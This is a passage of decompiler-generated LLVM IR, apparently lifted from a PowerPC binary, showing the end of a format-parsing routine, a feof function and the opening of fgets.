  %v4_1000e2e4 = load i16, i16* %v3_1000e2e4, align 2
  %v5_1000e2e4 = sext i16 %v4_1000e2e4 to i32
  store i32 %v5_1000e2e4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100171dc.635 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_10017208.631 to i32), i32* @r8, align 4
  %v2_1000e2f4 = add i32 %v1_1000e2dc, ptrtoint (i32* @global_var_100171dc.635 to i32)
  %v3_1000e2f4 = inttoptr i32 %v2_1000e2f4 to i16*
  %v4_1000e2f4 = load i16, i16* %v3_1000e2f4, align 2
  %v5_1000e2f4 = sext i16 %v4_1000e2f4 to i32
  store i32 %v5_1000e2f4, i32* %r9.global-to-local, align 4
  %v2_1000e2f8 = or i32 %v5_1000e2e4, %v1_1000e278
  store i32 %v2_1000e2f8, i32* %r0.global-to-local, align 4
  %v2_1000e2fc = and i32 %v5_1000e2f4, %v2_1000e2f8
  store i32 %v2_1000e2fc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e310

dec_label_pc_1000e304:                            ; preds = %dec_label_pc_1000e2a0
  %v1_1000e304 = add i32 %v1_1000e2ac, 1
  %v2_1000e304 = inttoptr i32 %v1_1000e304 to i8*
  %v3_1000e304 = load i8, i8* %v2_1000e304, align 1
  %v4_1000e304 = zext i8 %v3_1000e304 to i32
  store i32 %v4_1000e304, i32* %r0.global-to-local, align 4
  store i32 %v1_1000e304, i32* @r8, align 4
  %v3_1000e308 = icmp eq i8 %v3_1000e304, 0
  br i1 %v3_1000e308, label %dec_label_pc_1000e310, label %dec_label_pc_1000e2a0

dec_label_pc_1000e310:                            ; preds = %dec_label_pc_1000e304, %dec_label_pc_1000e2d4
  %v0_1000e310 = phi i32 [ %v2_1000e2fc, %dec_label_pc_1000e2d4 ], [ %v3_1000e290, %dec_label_pc_1000e304 ]
  store i32 %v0_1000e310, i32* %stack_var_-96, align 4
  %v0_1000e314 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000e314 = call i32 @__asm_rlwinm(i32 %v0_1000e314, i32 30, i32 31, i32 31)
  %not.v2_1000e318 = icmp eq i32 %v1_1000e314, 0
  %v6_1000e31c = sext i1 %not.v2_1000e318 to i32
  store i32 %v6_1000e31c, i32* %r9.global-to-local, align 4
  %v1_1000e320 = call i32 @__asm_rlwinm(i32 %v1_1000e278, i32 0, i32 20, i32 23)
  store i32 %v1_1000e320, i32* %r0.global-to-local, align 4
  %v1_1000e324 = call i32 @__asm_rlwinm(i32 %v6_1000e31c, i32 0, i32 0, i32 27)
  store i32 %v1_1000e324, i32* %r9.global-to-local, align 4
  %v0_1000e328 = load i32, i32* @r30, align 4
  %v1_1000e328 = inttoptr i32 %v0_1000e328 to i8*
  %v2_1000e328 = load i8, i8* %v1_1000e328, align 1
  %v3_1000e328 = zext i8 %v2_1000e328 to i32
  store i32 %v3_1000e328, i32* %r10.global-to-local, align 4
  %v0_1000e32c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000e32c = call i32 @__asm_rlwinm(i32 %v0_1000e32c, i32 0, i32 30, i32 28)
  %v1_1000e330 = add i32 %v1_1000e324, 48
  store i32 %v1_1000e330, i32* %r9.global-to-local, align 4
  %v2_1000e334 = or i32 %v1_1000e32c, %v1_1000e320
  store i32 %v2_1000e334, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v0_1000e33c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e33c = load i32, i32* @r28, align 4
  %v2_1000e33c = add i32 %v1_1000e33c, 12
  %v3_1000e33c = inttoptr i32 %v2_1000e33c to i32*
  store i32 %v0_1000e33c, i32* %v3_1000e33c, align 4
  %v0_1000e340 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000e340 = load i32, i32* @r28, align 4
  %v2_1000e340 = add i32 %v1_1000e340, 4
  %v3_1000e340 = inttoptr i32 %v2_1000e340 to i32*
  store i32 %v0_1000e340, i32* %v3_1000e340, align 4
  %v0_1000e344 = load i32, i32* @r31, align 4
  %v1_1000e344 = load i32, i32* @r28, align 4
  %v2_1000e344 = add i32 %v1_1000e344, 8
  %v3_1000e344 = inttoptr i32 %v2_1000e344 to i32*
  store i32 %v0_1000e344, i32* %v3_1000e344, align 4
  %v0_1000e348 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e348 = load i32, i32* @r28, align 4
  %v2_1000e348 = add i32 %v1_1000e348, 20
  %v3_1000e348 = inttoptr i32 %v2_1000e348 to i32*
  store i32 %v0_1000e348, i32* %v3_1000e348, align 4
  %v0_1000e34c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e34c = load i32, i32* @r28, align 4
  %v2_1000e34c = add i32 %v1_1000e34c, 16
  %v3_1000e34c = inttoptr i32 %v2_1000e34c to i32*
  store i32 %v0_1000e34c, i32* %v3_1000e34c, align 4
  %v0_1000e350 = load i32, i32* @r7, align 4
  %v1_1000e350 = load i32, i32* @r28, align 4
  %v2_1000e350 = add i32 %v1_1000e350, 28
  %v3_1000e350 = inttoptr i32 %v2_1000e350 to i32*
  store i32 %v0_1000e350, i32* %v3_1000e350, align 4
  %v0_1000e354 = load i32, i32* @r8, align 4
  %v1_1000e354 = inttoptr i32 %v0_1000e354 to i8*
  %v2_1000e354 = load i8, i8* %v1_1000e354, align 1
  %v3_1000e354 = zext i8 %v2_1000e354 to i32
  store i32 %v3_1000e354, i32* %r9.global-to-local, align 4
  %v3_1000e358 = icmp eq i8 %v2_1000e354, 0
  br i1 %v3_1000e358, label %dec_label_pc_1000e360, label %dec_label_pc_1000e378

dec_label_pc_1000e360:                            ; preds = %dec_label_pc_1000e310
  %v0_1000e360 = load i32, i32* @r30, align 4
  %v1_1000e360 = inttoptr i32 %v0_1000e360 to i8*
  %v2_1000e360 = load i8, i8* %v1_1000e360, align 1
  %v3_1000e360 = zext i8 %v2_1000e360 to i32
  store i32 %v3_1000e360, i32* %r0.global-to-local, align 4
  %v3_1000e364 = icmp eq i8 %v2_1000e360, 109
  br i1 %v3_1000e364, label %dec_label_pc_1000e36c, label %dec_label_pc_1000e4b0

dec_label_pc_1000e36c:                            ; preds = %dec_label_pc_1000e360
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1000e370 = load i32, i32* @r28, align 4
  %v2_1000e370 = add i32 %v1_1000e370, 28
  %v3_1000e370 = inttoptr i32 %v2_1000e370 to i32*
  store i32 %v3_1000e354, i32* %v3_1000e370, align 4
  %v0_1000e374 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e374 = load i32, i32* @r28, align 4
  %v2_1000e374 = add i32 %v1_1000e374, 32
  %v3_1000e374 = inttoptr i32 %v2_1000e374 to i32*
  store i32 %v0_1000e374, i32* %v3_1000e374, align 4
  br label %dec_label_pc_1000e378

dec_label_pc_1000e378:                            ; preds = %dec_label_pc_1000e310, %dec_label_pc_1000e36c
  %v0_1000e378 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_1000e378, 1
  br i1 %tmp62, label %dec_label_pc_1000e454, label %dec_label_pc_1000e380

dec_label_pc_1000e380:                            ; preds = %dec_label_pc_1000e378
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000e384

dec_label_pc_1000e384:                            ; preds = %dec_label_pc_1000e43c, %dec_label_pc_1000e380
  %v0_1000e3ac = phi i32 [ 0, %dec_label_pc_1000e380 ], [ %v1_1000e440, %dec_label_pc_1000e43c ]
  %v2_1000e384 = icmp sgt i32 %v0_1000e3ac, 2
  br i1 %v2_1000e384, label %dec_label_pc_1000e3a8, label %dec_label_pc_1000e38c

dec_label_pc_1000e38c:                            ; preds = %dec_label_pc_1000e384
  %v1_1000e38c = mul i32 %v0_1000e3ac, 4
  store i32 %v1_1000e38c, i32* %r0.global-to-local, align 4
  %v0_1000e390 = load i32, i32* @r1, align 4
  %v2_1000e390 = add i32 %v0_1000e390, %v1_1000e38c
  store i32 %v2_1000e390, i32* %r9.global-to-local, align 4
  %v1_1000e394 = add i32 %v2_1000e390, 20
  %v2_1000e394 = inttoptr i32 %v1_1000e394 to i32*
  %v3_1000e394 = load i32, i32* %v2_1000e394, align 4
  store i32 %v3_1000e394, i32* %r0.global-to-local, align 4
  %v1_1000e398 = load i32, i32* @r28, align 4
  %v2_1000e398 = add i32 %v1_1000e398, %v0_1000e3ac
  store i32 %v2_1000e398, i32* %r9.global-to-local, align 4
  %v1_1000e39c = urem i32 %v3_1000e394, 256
  store i32 %v1_1000e39c, i32* %r11.global-to-local, align 4
  %v1_1000e3a0 = trunc i32 %v3_1000e394 to i8
  %v3_1000e3a0 = add i32 %v2_1000e398, 36
  %v4_1000e3a0 = inttoptr i32 %v3_1000e3a0 to i8*
  store i8 %v1_1000e3a0, i8* %v4_1000e3a0, align 1
  %v0_1000e3b4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e3b4

dec_label_pc_1000e3a8:                            ; preds = %dec_label_pc_1000e384
  %v2_1000e3ac = add i32 %v0_1000e3ac, %stack_var_-84.3
  store i32 %v2_1000e3ac, i32* %r9.global-to-local, align 4
  %v1_1000e3b0 = add i32 %v2_1000e3ac, -2
  store i32 %v1_1000e3b0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e3b4

dec_label_pc_1000e3b4:                            ; preds = %dec_label_pc_1000e38c, %dec_label_pc_1000e3a8
  %v0_1000e3d4 = phi i32 [ %v0_1000e3b4.pre, %dec_label_pc_1000e38c ], [ %v1_1000e3b0, %dec_label_pc_1000e3a8 ]
  %v1_1000e3b4 = load i32, i32* @r26, align 4
  %v3_1000e3b4 = icmp sgt i32 %v0_1000e3d4, %v1_1000e3b4
  br i1 %v3_1000e3b4, label %dec_label_pc_1000e3bc, label %dec_label_pc_1000e3c8

dec_label_pc_1000e3bc:                            ; preds = %dec_label_pc_1000e3b4
  %v2_1000e3bc = icmp sgt i32 %v0_1000e3d4, 9
  br i1 %v2_1000e3bc, label %dec_label_pc_1000e4b0, label %dec_label_pc_1000e3c4

dec_label_pc_1000e3c4:                            ; preds = %dec_label_pc_1000e3bc
  store i32 %v0_1000e3d4, i32* @r26, align 4
  br label %dec_label_pc_1000e3c8

dec_label_pc_1000e3c8:                            ; preds = %dec_label_pc_1000e3b4, %dec_label_pc_1000e3c4
  store i32 %v2_1000e064.pre-phi, i32* %r9.global-to-local, align 4
  %v0_1000e3cc = load i32, i32* @r27, align 4
  %v1_1000e3cc = mul i32 %v0_1000e3cc, 4
  store i32 %v1_1000e3cc, i32* %r0.global-to-local, align 4
  %v2_1000e3d0 = add i32 %v1_1000e3cc, %v2_1000e064.pre-phi
  %v3_1000e3d0 = inttoptr i32 %v2_1000e3d0 to i32*
  %v4_1000e3d0 = load i32, i32* %v3_1000e3d0, align 4
  store i32 %v4_1000e3d0, i32* @r31, align 4
  %v1_1000e3d4 = add i32 %v0_1000e3d4, -1
  store i32 %v1_1000e3d4, i32* @r25, align 4
  %v1_1000e3d8 = mul i32 %v1_1000e3d4, 4
  %v3_1000e3dc = icmp eq i32 %v4_1000e3d0, 8
  %v1_1000e3e0 = load i32, i32* @r28, align 4
  %v2_1000e3e0 = add i32 %v1_1000e3e0, %v1_1000e3d8
  store i32 %v2_1000e3e0, i32* %r9.global-to-local, align 4
  %v1_1000e3e4 = add i32 %v2_1000e3e0, 40
  %v2_1000e3e4 = inttoptr i32 %v1_1000e3e4 to i32*
  %v3_1000e3e4 = load i32, i32* %v2_1000e3e4, align 4
  store i32 %v3_1000e3e4, i32* %r3.global-to-local, align 4
  br i1 %v3_1000e3dc, label %dec_label_pc_1000e43c, label %dec_label_pc_1000e3ec

dec_label_pc_1000e3ec:                            ; preds = %dec_label_pc_1000e3c8
  %v3_1000e3ec = icmp eq i32 %v3_1000e3e4, 8
  br i1 %v3_1000e3ec, label %dec_label_pc_1000e424, label %dec_label_pc_1000e3f4

dec_label_pc_1000e3f4:                            ; preds = %dec_label_pc_1000e3ec
  %v4_1000e3f4 = icmp eq i32 %v3_1000e3e4, %v4_1000e3d0
  br i1 %v4_1000e3f4, label %dec_label_pc_1000e424, label %dec_label_pc_1000e3fc

dec_label_pc_1000e3fc:                            ; preds = %dec_label_pc_1000e3f4
  %v1_1000e3fc = call i32 @_promoted_size(i32 %v3_1000e3e4)
  store i32 %v1_1000e3fc, i32* @r29, align 4
  %v0_1000e404 = load i32, i32* @r31, align 4
  store i32 %v0_1000e404, i32* %r3.global-to-local, align 4
  %v1_1000e408 = call i32 @_promoted_size(i32 %v0_1000e404)
  store i32 %v1_1000e408, i32* %r3.global-to-local, align 4
  %v0_1000e414 = call i32 @__asm_mfcr()
  store i32 %v0_1000e414, i32* %r3.global-to-local, align 4
  store i32 %v0_1000e414, i32* %r0.global-to-local, align 4
  %v1_1000e418 = call i32 @__asm_rlwinm(i32 %v0_1000e414, i32 31, i32 31, i32 31)
  store i32 %v1_1000e418, i32* %r0.global-to-local, align 4
  %v3_1000e41c = icmp eq i32 %v1_1000e418, 0
  br i1 %v3_1000e41c, label %dec_label_pc_1000e43c, label %dec_label_pc_1000e3fc.dec_label_pc_1000e424_crit_edge

dec_label_pc_1000e3fc.dec_label_pc_1000e424_crit_edge: ; preds = %dec_label_pc_1000e3fc
  %v0_1000e428.pre = load i32, i32* @r27, align 4
  %v0_1000e430.pre = load i32, i32* @r25, align 4
  %v1_1000e434.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000e424

dec_label_pc_1000e424:                            ; preds = %dec_label_pc_1000e3fc.dec_label_pc_1000e424_crit_edge, %dec_label_pc_1000e3f4, %dec_label_pc_1000e3ec
  %v1_1000e434 = phi i32 [ %v1_1000e434.pre, %dec_label_pc_1000e3fc.dec_label_pc_1000e424_crit_edge ], [ %v1_1000e3e0, %dec_label_pc_1000e3f4 ], [ %v1_1000e3e0, %dec_label_pc_1000e3ec ]
  %v0_1000e430 = phi i32 [ %v0_1000e430.pre, %dec_label_pc_1000e3fc.dec_label_pc_1000e424_crit_edge ], [ %v1_1000e3d4, %dec_label_pc_1000e3f4 ], [ %v1_1000e3d4, %dec_label_pc_1000e3ec ]
  %v0_1000e428 = phi i32 [ %v0_1000e428.pre, %dec_label_pc_1000e3fc.dec_label_pc_1000e424_crit_edge ], [ %v0_1000e3cc, %dec_label_pc_1000e3f4 ], [ %v0_1000e3cc, %dec_label_pc_1000e3ec ]
  store i32 %v2_1000e064.pre-phi, i32* %r9.global-to-local, align 4
  %v1_1000e428 = mul i32 %v0_1000e428, 4
  store i32 %v1_1000e428, i32* %r0.global-to-local, align 4
  %v2_1000e42c = add i32 %v1_1000e428, %v2_1000e064.pre-phi
  %v3_1000e42c = inttoptr i32 %v2_1000e42c to i32*
  %v4_1000e42c = load i32, i32* %v3_1000e42c, align 4
  store i32 %v4_1000e42c, i32* %r0.global-to-local, align 4
  %v1_1000e430 = mul i32 %v0_1000e430, 4
  %v2_1000e434 = add i32 %v1_1000e430, %v1_1000e434
  store i32 %v2_1000e434, i32* %r9.global-to-local, align 4
  %v2_1000e438 = add i32 %v2_1000e434, 40
  %v3_1000e438 = inttoptr i32 %v2_1000e438 to i32*
  store i32 %v4_1000e42c, i32* %v3_1000e438, align 4
  br label %dec_label_pc_1000e43c

dec_label_pc_1000e43c:                            ; preds = %dec_label_pc_1000e3fc, %dec_label_pc_1000e3c8, %dec_label_pc_1000e424
  %v0_1000e43c = load i32, i32* @r28, align 4
  %v1_1000e43c = add i32 %v0_1000e43c, 28
  %v2_1000e43c = inttoptr i32 %v1_1000e43c to i32*
  %v3_1000e43c = load i32, i32* %v2_1000e43c, align 4
  %v0_1000e440 = load i32, i32* @r27, align 4
  %v1_1000e440 = add i32 %v0_1000e440, 1
  store i32 %v1_1000e440, i32* @r27, align 4
  %v1_1000e444 = add i32 %v3_1000e43c, 2
  store i32 %v1_1000e444, i32* %r9.global-to-local, align 4
  %v2_1000e448 = icmp slt i32 %v1_1000e440, %v1_1000e444
  br i1 %v2_1000e448, label %dec_label_pc_1000e384, label %dec_label_pc_1000e46c

dec_label_pc_1000e454:                            ; preds = %dec_label_pc_1000e378
  %v0_1000e454 = load i32, i32* @r28, align 4
  %v1_1000e454 = add i32 %v0_1000e454, 28
  %v2_1000e454 = inttoptr i32 %v1_1000e454 to i32*
  %v3_1000e454 = load i32, i32* %v2_1000e454, align 4
  store i32 %v3_1000e454, i32* %r5.global-to-local, align 4
  %v1_1000e458 = add i32 %v0_1000e454, 40
  store i32 %v1_1000e458, i32* @r3, align 4
  %v0_1000e45c = load i32, i32* @r7, align 4
  %v1_1000e45c = trunc i32 %v0_1000e45c to i8
  %v3_1000e45c = add i32 %v0_1000e454, 38
  %v4_1000e45c = inttoptr i32 %v3_1000e45c to i8*
  store i8 %v1_1000e45c, i8* %v4_1000e45c, align 1
  %v2_1000e460 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000e460, i32* @r4, align 4
  %v0_1000e464 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000e464 = mul i32 %v0_1000e464, 4
  store i32 %v1_1000e464, i32* @r5, align 4
  store i32 268493932, i32* @lr, align 4
  %v0_1000e468 = call i32 @memcpy()
  store i32 %v0_1000e468, i32* %r3.global-to-local, align 4
  %v0_1000e46c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000e46c

dec_label_pc_1000e46c:                            ; preds = %dec_label_pc_1000e43c, %dec_label_pc_1000e454
  %v0_1000e46c = phi i32 [ %v0_1000e46c.pre, %dec_label_pc_1000e454 ], [ %v0_1000e43c, %dec_label_pc_1000e43c ]
  %v1_1000e46c = add i32 %v0_1000e46c, 16
  %v2_1000e46c = inttoptr i32 %v1_1000e46c to i32*
  %v3_1000e46c = load i32, i32* %v2_1000e46c, align 4
  store i32 %v3_1000e46c, i32* %r0.global-to-local, align 4
  %v0_1000e470 = load i32, i32* @r26, align 4
  %v2_1000e470 = add i32 %v0_1000e46c, 24
  %v3_1000e470 = inttoptr i32 %v2_1000e470 to i32*
  store i32 %v0_1000e470, i32* %v3_1000e470, align 4
  %v0_1000e474 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e474 = and i32 %v0_1000e474, 128
  store i32 %v1_1000e474, i32* %r9.global-to-local, align 4
  %v3_1000e474 = icmp eq i32 %v1_1000e474, 0
  br i1 %v3_1000e474, label %dec_label_pc_1000e47c, label %dec_label_pc_1000e488

dec_label_pc_1000e47c:                            ; preds = %dec_label_pc_1000e46c
  %v0_1000e47c = load i32, i32* @r30, align 4
  %v1_1000e47c = add i32 %v0_1000e47c, 1
  store i32 %v1_1000e47c, i32* %r0.global-to-local, align 4
  %v1_1000e480 = load i32, i32* @r28, align 4
  %v2_1000e480 = inttoptr i32 %v1_1000e480 to i32*
  store i32 %v1_1000e47c, i32* %v2_1000e480, align 4
  br label %dec_label_pc_1000e4a0

dec_label_pc_1000e488:                            ; preds = %dec_label_pc_1000e46c
  %v2_1000e488 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_1000e488, i32* %r0.global-to-local, align 4
  %v0_1000e48c = load i32, i32* @r28, align 4
  %v1_1000e48c = inttoptr i32 %v0_1000e48c to i32*
  %v2_1000e48c = load i32, i32* %v1_1000e48c, align 4
  %v1_1000e490 = load i32, i32* @r30, align 4
  %v2_1000e490 = sub i32 %v1_1000e490, %v2_1000e488
  %v1_1000e494 = mul i32 %v2_1000e490, 4
  store i32 %v1_1000e494, i32* %r0.global-to-local, align 4
  %v2_1000e498 = add i32 %v1_1000e494, %v2_1000e48c
  store i32 %v2_1000e498, i32* %r9.global-to-local, align 4
  store i32 %v2_1000e498, i32* %v1_1000e48c, align 4
  br label %dec_label_pc_1000e4a0

dec_label_pc_1000e4a0:                            ; preds = %dec_label_pc_1000e47c, %dec_label_pc_1000e488
  %v0_1000e4a0 = load i32, i32* @r28, align 4
  %v1_1000e4a0 = add i32 %v0_1000e4a0, 28
  %v2_1000e4a0 = inttoptr i32 %v1_1000e4a0 to i32*
  %v3_1000e4a0 = load i32, i32* %v2_1000e4a0, align 4
  store i32 %v3_1000e4a0, i32* %r9.global-to-local, align 4
  %v1_1000e4a4 = add i32 %v3_1000e4a0, 2
  br label %dec_label_pc_1000e4b0

dec_label_pc_1000e4b0:                            ; preds = %dec_label_pc_1000e014, %dec_label_pc_1000e0e8, %dec_label_pc_1000e1c4, %dec_label_pc_1000e1b8, %dec_label_pc_1000e1e0, %dec_label_pc_1000e11c, %dec_label_pc_1000e3bc, %dec_label_pc_1000e26c, %dec_label_pc_1000e360, %dec_label_pc_1000e4a0
  %storemerge2 = phi i32 [ %v1_1000e4a4, %dec_label_pc_1000e4a0 ], [ -1, %dec_label_pc_1000e360 ], [ -1, %dec_label_pc_1000e26c ], [ -1, %dec_label_pc_1000e3bc ], [ -1, %dec_label_pc_1000e11c ], [ -1, %dec_label_pc_1000e1e0 ], [ -1, %dec_label_pc_1000e1b8 ], [ -1, %dec_label_pc_1000e1c4 ], [ -1, %dec_label_pc_1000e0e8 ], [ -1, %dec_label_pc_1000e014 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_1000dfac, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_1000e494, { 1, 0 }
  uselistorder i32 %v0_1000e46c, { 1, 0 }
  uselistorder i32 %v1_1000e440, { 1, 2, 0 }
  uselistorder i32 %v1_1000e428, { 1, 0 }
  uselistorder i32 %v0_1000e414, { 0, 2, 1 }
  uselistorder i32 %v3_1000e3e4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000e3e0, { 1, 2, 0 }
  uselistorder i32 %v1_1000e3d4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000e3cc, { 1, 0 }
  uselistorder i32 %v0_1000e3cc, { 1, 2, 0 }
  uselistorder i32 %v3_1000e394, { 1, 0, 2 }
  uselistorder i32 %v1_1000e38c, { 1, 0 }
  uselistorder i32 %v0_1000e3ac, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000e304, { 1, 2, 0 }
  uselistorder i32 %v1_1000e2dc, { 2, 1, 0 }
  uselistorder i32 %v1_1000e2c8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000e2ac, { 1, 0, 2 }
  uselistorder i32 %v1_1000e278, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000e234, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000e1f8, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000e1e4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1000e154, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000e150, { 1, 0 }
  uselistorder i32 %v0_1000e168, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_1000e0cc, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_1000e0c4, { 1, 0 }
  uselistorder i32 %v1_1000e0b4, { 1, 0 }
  uselistorder i32 %v3_1000e0ac, { 1, 0, 2 }
  uselistorder i32 %v0_1000e128, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1000e0f8, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_1000e088, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000e070, { 1, 0 }
  uselistorder i32 %v2_1000e064.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000e044, { 1, 0 }
  uselistorder i32 %v1_1000e02c, { 1, 2, 0 }
  uselistorder i32 %v0_1000e020, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 5, 6, 7, 11, 4, 12, 8, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_10017208.631 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_100171c8.630 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e4b0, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000e4a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e46c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e43c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e3c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e3b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e378, { 1, 0 }
  uselistorder label %dec_label_pc_1000e2c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e26c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e21c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e1f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e1a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e1a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e114, { 1, 0 }
  uselistorder label %dec_label_pc_1000e10c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e0ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000e0a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e094, { 1, 0 }
  uselistorder label %dec_label_pc_1000e074, { 1, 0 }
  uselistorder label %dec_label_pc_1000e070, { 1, 0 }
  uselistorder label %dec_label_pc_1000e054, { 1, 0 }
}

define i32 @feof(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000e4cc = call i32 @__asm_mfcr()
  store i32 %v0_1000e4cc, i32* %r31.global-to-local, align 4
  %v2_1000e4f0 = add i32 %v0_1000e4cc, 52
  %v3_1000e4f0 = inttoptr i32 %v2_1000e4f0 to i32*
  %v4_1000e4f0 = load i32, i32* %v3_1000e4f0, align 4
  %v2_1000e4f4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000e4f4, i32* @r3, align 4
  %v3_1000e4f8 = icmp eq i32 %v4_1000e4f0, 0
  store i1 %v3_1000e4f8, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000e4f8, label %dec_label_pc_1000e50c, label %dec_label_pc_1000e50c.thread

dec_label_pc_1000e50c.thread:                     ; preds = %entry
  %v1_1000e5143 = inttoptr i32 %v0_1000e4cc to i16*
  %v2_1000e5144 = load i16, i16* %v1_1000e5143, align 2
  %v3_1000e5145 = zext i16 %v2_1000e5144 to i32
  store i32 %v3_1000e5145, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e520

dec_label_pc_1000e50c:                            ; preds = %entry
  %v0_1000e500 = call i32 @__pthread_return_void()
  %v0_1000e508 = call i32 @__pthread_return_0()
  %v0_1000e514.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000e518.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_1000e4f4, i32* @r3, align 4
  %v1_1000e514 = inttoptr i32 %v0_1000e514.pre to i16*
  %v2_1000e514 = load i16, i16* %v1_1000e514, align 2
  %v3_1000e514 = zext i16 %v2_1000e514 to i32
  store i32 %v3_1000e514, i32* %r31.global-to-local, align 4
  br i1 %v0_1000e518.pre, label %dec_label_pc_1000e51c, label %dec_label_pc_1000e520

dec_label_pc_1000e51c:                            ; preds = %dec_label_pc_1000e50c
  %v0_1000e51c = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000e520

dec_label_pc_1000e520:                            ; preds = %dec_label_pc_1000e50c.thread, %dec_label_pc_1000e50c, %dec_label_pc_1000e51c
  %v3_1000e5146 = phi i32 [ %v3_1000e5145, %dec_label_pc_1000e50c.thread ], [ %v3_1000e514, %dec_label_pc_1000e50c ], [ %v3_1000e514, %dec_label_pc_1000e51c ]
  %v1_1000e524 = call i32 @__asm_rlwinm(i32 %v3_1000e5146, i32 0, i32 29, i32 29)
  %v1_1000e534 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000e4cc)
  %v9_1000e534 = extractvalue %0 %v1_1000e534, 7
  store i4 %v9_1000e534, i4* @cr4, align 1
  ret i32 %v1_1000e524

; uselistorder directives
  uselistorder i32 %v0_1000e4cc, { 3, 0, 1, 2 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000e520, { 2, 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
